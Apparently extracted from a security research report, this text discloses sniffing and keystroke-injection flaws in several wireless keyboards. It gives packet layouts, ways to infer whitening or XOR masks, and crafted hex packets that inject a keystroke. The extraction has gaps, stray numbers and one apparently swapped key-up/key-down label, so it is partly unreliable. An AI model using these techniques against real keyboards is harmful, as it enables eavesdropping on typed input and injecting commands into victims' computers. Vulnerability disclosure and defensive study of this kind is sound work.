Unencrypted Keystroke Sniﬃng and Injection (BN-0010)
MOSART-based keyboards and USB dongles communicate using an unencrypted wireless protocol, making it
possible to sni↵ keystrokes and inject malicious keystrokes.
The dongles reports to the host operating system as MOSART Semiconductor transceivers, however the speciﬁc
RFIC is unknown, and no publicly available documentation could be found.
The RF packets contain a preamble, address, payload, CRC, and postamble. The sync ﬁeld, payload, and CRC
are whitened by XORing with repeated 0x5A bytes, and the CRC is the XModem variant of CRC-CCITT.
An ’a’ keystroke is transmitted over the air in the following format:
AA:AA:AE:DD:D4:E8:23:DB:48:19:06:FF // ’a’ key down
AA:AA:AE:DD:D4:E8:20:5B:48:D1:44:FF // ’a’ key up

Unencrypted Keystroke Sniﬃng and Injection (BN-0010)
The keyboard and USB dongle communicate using an unencrypted wireless protocol, making it possible to sni↵
keystrokes and inject malicious keystrokes.
An example ’a’ keystroke is transmitted over the air in the following format:
00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23

AA AA AA A8 0F 71 4A DC EF 7A 2C 4A 2A 28 20 69 87 B8 7F 1D 8A 5F C3 17 // ’a’ key down
AA AA AA A8 0F 71 4A DC EF 7A 2C 4A 2A 28 20 69 A7 B8 7F 1D 8A 5F F6 1F // ’a’ key up
0-2: preamble
3-13: sync ﬁeld / address / packet type
14-21: keyboard data
22-23: CRC with polynomial 0x1021
The packet is whitened before being transmitted over the air, and the whitening sequence is speciﬁc to each paired
keyboard and dongle. It is not known how the whitening sequence is generated, but it can be inferred by pas-
sively listening to keyboard traﬃc.
The keyboard data (octets 14-21) are a whitened version of the HID packet that gets sent to the host operating
system when a key is pressed. The de-whitened HID packets in this example are as follows:
14 15 16 17 18 19 20 21
-----------------------
00 00 04 00 00 00 00 00 // ’a’ key up
00 00 00 00 00 00 00 00 // ’a’ key down
Since the HID packet when no keys are depressed is all 0x00 bytes, it can be inferred that the whitening sequence
is the same as bytes 14-21 in the second RF packet.
14 15 16 17 18 19 20 21
-----------------------
20 69 A7 B8 7F 1D 8A 5F // whitening sequence
Using this knowledge, an attacker can craft RF packets to inject arbitrary keystrokes. The HID and RF packets
for the key ’b’ are as follows:
14 15 16 17 18 19 20 21
-----------------------
00 00 05 00 00 00 00 00 // ’b’ down HID packet
20 69 07 B8 7F 1D 8A 5F // ’b’ down, reversed bit order, and XOR’d with the whitening sequence
The new RF packet pair to inject an ’b’ keystroke is as follows:
00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23
-----------------------------------------------------------------------
AA AA AA A8 0F 71 4A DC EF 7A 2C 4A 2A 28 20 69 07 B8 7F 1D 8A 5F 17 37 // ’b’ key down

Unencrypted Keystroke Injection (BN-0009)

00:00:0B:00:00:00:00:00:00
11.1.3
Encrypted Keystroke Injection (BN-0013)
The Lenovo Ultraslim keyboard encrypts RF packets, but the implementation makes it possible to infer the ci-
phertext and inject malicious keystrokes.
An ’a’ keypress causes the following two RF packets to be transmitted from the keyboard to the dongle:
49 C3 5B 02 59 52 86 9F 38 36 27 EF AC // ’a’ key down
4C 66 E1 46 76 1A 72 F4 F5 C0 0D 85 C3 // ’a’ key up
Octets 0 and 2-7 are octets 0 and 2-7 of a keyboard HID packet XOR’d with ciphertext. The value of octet 1
does not appear to have any e↵ect on the resulting HID packet.
The unencrypted octets 0 and 2-7 are as follows. Octet 1 in the HID packet is always 0x00.
00 XX 04 00 00 00 00 // ’a’ key down
00 XX 00 00 00 00 00 // ’a’ key up
Due to the fact that a ’key up’ keyboard HID packet consists of all 0x00 bytes, one can infer that octets 0 and 2-
7 of the second packet represent unaltered ciphertext.
Using this knowledge, it is possible to inject arbitrary encrypted keystrokes without knowledge of the encryption
key.
In this scenario, transmitting the following two RF packets will cause a ’b’ keystroke to be sent to the host com-
puter:
4C 66 E4 46 76 1A 72 F4 F5 C0 0D 85 C3 // ’b’ key down
4C 66 E1 46 76 1A 72 F4 F5 C0 0D 85 C3 // ’b’ key up
Octet 2 of the ﬁrst packet has been XOR’d with 0x05, the HID scan code for ’b’. The second packet is the un-
changed ’key up’ packet previously observed.

Unencrypted Keystroke Injection (BN-0004)
Current Microsoft wireless keyboards encrypt keystroke data using 128-bit AES encryption. The prior generation
of Microsoft wireless keyboards used XOR encryption which was shown to be insecure.
USB dongles from both the AES and XOR encrypted generations of Microsoft wireless keyboards accept unen-
crypted keystroke packets transmitted to the RF address of a wireless mouse. This applies to standalone wireless
mice, as well as mice sold as part of a keyboard and mouse set.

The HP Wireless Elite v2 wireless keyboard appears to utilize the 128-bit AES encryption provided by the nRF24L
transceivers in the keyboard and dongle, but it is implemented in such a way that it is possible to inject keyboard
packets without knowledge of the AES key.
A typical sequence of key presses looks like this over the air:

The key down and key up packets are both XOR’d with an 8 byte mask, which appears to be derived during the
crypto exchange. The keyboard will continue to use the same XOR mask for subsequent packets, and only initi-
ates a key rotation periodically.
key up HID packets are a sequence of 8 0x00 bytes, so it is possible to infer the XOR mask by observing a key
press sequence, and using the key up packet as the XOR mask.
Once the XOR mask is known, it is possible to craft and inject arbitrary keyboard packets, which cause keyboard
HID packets to be send to the host operating system.
33
Due to the fact that the keyboard is responsible for initiating the crypto exchange, the last used XOR mask can
be used indeﬁnitely while the user is not active typing.
